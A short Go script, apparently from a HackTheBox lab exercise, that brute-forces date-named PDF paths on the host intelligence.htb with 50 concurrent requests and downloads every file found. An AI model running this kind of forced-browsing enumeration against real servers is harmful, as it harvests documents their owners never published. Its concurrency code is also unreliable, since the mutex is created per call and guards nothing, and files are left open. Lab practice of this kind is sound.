//usr/bin/env go run $0 $@; exit $?

package main

import (
	"fmt"
	"os"
	"sync"
	"time"

	"io/ioutil"
	"net/http"
)

const THREADS = 50

var guard = make(chan struct{}, THREADS)
var nFound = 0

func writeToPdf(filename string, content []byte) {
	var m sync.Mutex
	m.Lock()
	defer m.Unlock()

	nFound++
	file, err := os.Create(filename)

	if err != nil {
		panic(err)
	}

	_, err = file.Write(content)

	if err != nil {
		panic(err)
	}
}

func requestPdf(year, month, day int) {
	guard <- struct{}{}

	filename := fmt.Sprintf("%d-%02d-%02d-upload.pdf", year, month, day)
	res, err := http.Get("http://intelligence.htb/documents/" + filename)

	if err != nil {
		panic(err)
	}

	defer res.Body.Close()

	if res.StatusCode == 200 {
		body, err := ioutil.ReadAll(res.Body)

		if err != nil {
			panic(err)
		}

		writeToPdf(filename, body)
	}

	<-guard
}

func main() {
	var wg sync.WaitGroup

	fmt.Println("Fuzzing PDF files of the form: YYYY-MM-DD-upload.pdf")

	start := time.Now()
	year := 2020

	for month := 1; month <= 12; month++ {
		for day := 1; day <= 31; day++ {
			wg.Add(1)

			go func(year, month, day int) {
				defer wg.Done()
				requestPdf(year, month, day)
			}(year, month, day)
		}
	}

	wg.Wait()

	fmt.Printf("Found %d files in %s\n", nFound, time.Since(start))
}
